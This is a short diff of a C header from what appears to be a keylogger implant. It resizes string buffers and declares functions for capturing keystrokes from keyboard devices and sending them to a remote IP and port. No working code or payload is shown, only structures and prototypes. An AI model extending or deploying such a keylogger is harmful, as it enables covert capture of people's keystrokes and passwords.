@@ -20,6 +20,8 @@
 
 #define QUEUE_BUFFER_SIZE 1024
 
+#define STRING_BUFFER_SIZE 256
+
 /*
     represents whatever data is currently logged for a single keyboard
     also holds its file descriptor
@@ -31,7 +33,7 @@ struct keyboard_s {
     ssize_t nb_chars;
     char buffer[QUEUE_BUFFER_SIZE];
 
-    char name[64];
+    char name[STRING_BUFFER_SIZE];
     TAILQ_ENTRY(keyboard_s) devices;
 };
 
@@ -46,7 +48,7 @@ typedef struct implant_s {
 
     /* remote connection settings */
     unsigned short port;
-    char ip[256];
+    char ip[STRING_BUFFER_SIZE];
     int disable_net:1;
 
     /* keyboard settings */
@@ -74,12 +76,13 @@ typedef struct implant_s {
 
 // net.c
 int init_remote_connection(implant_t *);
+int send_key_description(int, char [STRING_BUFFER_SIZE]);
 
 // opt.c
 int parse_user_input(int, char **, implant_t *);
 
 // logger.c
-void keylog(implant_t *);
+void keylog(implant_t *, int);
 
 // keyboard.c
 void fetch_available_keyboards(implant_t *);
